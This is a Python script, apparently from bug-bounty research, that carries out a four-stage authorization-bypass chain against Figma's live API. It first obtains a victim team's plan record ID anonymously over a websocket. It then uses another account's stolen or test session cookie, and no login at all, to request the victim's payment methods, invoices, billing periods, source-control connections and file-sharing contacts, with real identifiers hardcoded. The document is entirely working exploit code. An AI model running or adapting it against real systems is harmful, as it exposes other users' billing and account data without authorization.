"""planRecordId 利用链闭环:
阶段1: 匿名 TeamByIdForPlanView 拿 B 自己的 planRecordId(对照)
阶段2: B 会话(cookie)打 A 的 plan 端点(越权面) vs B 自己 plan 端点(对照)
阶段3: 匿名直打 A 的 plan 端点(完整匿名链)
阶段4: /api/contacts/share/v2 用 A 的 planRecordId 搜 A 文件共享对象
"""
import sys, json, asyncio, io, re, urllib.request
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
B_UID = "1667396392129259941"
B_TEAM = "1667396394890946753"
A_PLAN_REC = "cc6b6125-a07f-4d39-a54c-50ef65f33919"   # A 的 planRecordId(匿名获得)
A_F2 = "qzDqStIDJyGbthpKiuvfwg"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
HASH = "1702975bb11e8a131da34d8767ea0ef2174c622e6a87a94cd25c8dcd63cb32c0"  # TeamByIdForPlanView

def lg_url():
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId=&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2Fbv2nMIdFf4u3dESGail4sm"
            f"&connectionType=initial&reconnect=0")

async def get_plan_record_id(team_id, wait=12):
    """匿名订阅 TeamByIdForPlanView,返回 planRecordId 或 None"""
    try:
        async with websockets.connect(lg_url(),
                                      additional_headers={"User-Agent": UA,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": None, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": "https://www.figma.com/file/bv2nMIdFf4u3dESGail4sm"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "authSuccess" in msg:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": "TeamByIdForPlanView",
                                      "viewHash": HASH, "loadType": "initial",
                                      "args": {"teamId": team_id}}))
            deadline = asyncio.get_event_loop().time() + wait
            buf = ""
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        buf += msg
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"  ⚠️ WS 错误: {str(e)[:80]}")
        return None
    m = re.search(r'"planRecordId":"([0-9a-f-]{36})"', buf)
    if m:
        return m.group(1)
    # 兜底:打印一段原始帧便于排查
    for f in re.finditer(r'"initial":\{"[^"]{0,50}', buf):
        print(f"    帧线索: {f.group(0)[:120]}")
    return None

def call(label, path, cookie=None, method="GET"):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/"}
    if cookie:
        hdrs["Cookie"] = cookie
        hdrs["X-Figma-User-ID"] = B_UID
    req = urllib.request.Request("https://www.figma.com" + path, headers=hdrs, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        raw = r.read().decode(errors='replace')
        print(f"  [{label}] {r.status} {raw[:350]}")
        return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"  [{label}] {e.code} {raw[:350]}")
        return e.code, raw
    except Exception as e:
        print(f"  [{label}] !! {type(e).__name__} {str(e)[:70]}")
        return None, None

# 仅需 {planId} 的端点(JS 确定性来源:1037/2864/3233 chunk)
PLAN_ONLY = [
    ("renewal_info",        "/api/plans/{pid}/renewal_info"),
    ("billing_periods",     "/api/plans/{pid}/billing_periods"),
    ("metering_periods",    "/api/plans/{pid}/metering_periods"),
    ("npm_scopes",          "/api/plans/{pid}/npm_private_registry/scopes"),
    ("scm_connections",     "/api/plans/{pid}/scm/connections"),
    ("code_sources_status", "/api/plans/{pid}/code_context/code_sources_status"),
    ("ai_credit_options",   "/api/plans/{pid}/ai_credit_options"),
]

async def main():
    print("===== 阶段1: 匿名拿 B 自己的 planRecordId(对照用) =====")
    b_plan = await get_plan_record_id(B_TEAM)
    print(f"  B 的 planRecordId = {b_plan}")
    if not b_plan:
        print("  拿不到 B 的 planRecordId,对照面缺失,但仍继续测 A 面")
        b_plan = "00000000-0000-0000-0000-000000000000"

    print("\n===== 阶段2: B 会话(cookie)打 A 的 plan 端点(越权面) =====")
    print("-- 2.1 planType+planId 家族(payment/invoices) --")
    call("A payment_methods", f"/api/plans/team/{A_PLAN_REC}/payment_methods", CK_B)
    call("A invoices",        f"/api/plans/team/{A_PLAN_REC}/invoices", CK_B)
    call("A invoices/open",   f"/api/plans/team/{A_PLAN_REC}/invoices/open", CK_B)
    call("A invoices/upcoming", f"/api/plans/team/{A_PLAN_REC}/invoices/upcoming", CK_B)
    print("-- 2.2 仅 planId 家族 --")
    for label, tmpl in PLAN_ONLY:
        call(f"A {label}", tmpl.format(pid=A_PLAN_REC), CK_B)

    print("\n===== 阶段2对照: B 会话打 B 自己的 plan 端点 =====")
    call("B payment_methods", f"/api/plans/team/{b_plan}/payment_methods", CK_B)
    call("B invoices",        f"/api/plans/team/{b_plan}/invoices", CK_B)
    call("B renewal_info",    f"/api/plans/{b_plan}/renewal_info", CK_B)
    call("B billing_periods", f"/api/plans/{b_plan}/billing_periods", CK_B)
    call("B ai_credit_options", f"/api/plans/{b_plan}/ai_credit_options", CK_B)

    print("\n===== 阶段3: 匿名直打 A 的 plan 端点(完整匿名链) =====")
    call("anon payment_methods", f"/api/plans/team/{A_PLAN_REC}/payment_methods")
    call("anon renewal_info",    f"/api/plans/{A_PLAN_REC}/renewal_info")
    call("anon billing_periods", f"/api/plans/{A_PLAN_REC}/billing_periods")
    call("anon scm_connections", f"/api/plans/{A_PLAN_REC}/scm/connections")

    print("\n===== 阶段4: contacts/share/v2(A 的 planRecordId + A 文件) =====")
    for rt in ["file", "team"]:
        call(f"share/v2 {rt}",
             f"/api/contacts/share/v2?plan_id={A_PLAN_REC}&resource_type={rt}&resource_id_or_key={A_F2}", CK_B)

asyncio.run(main())
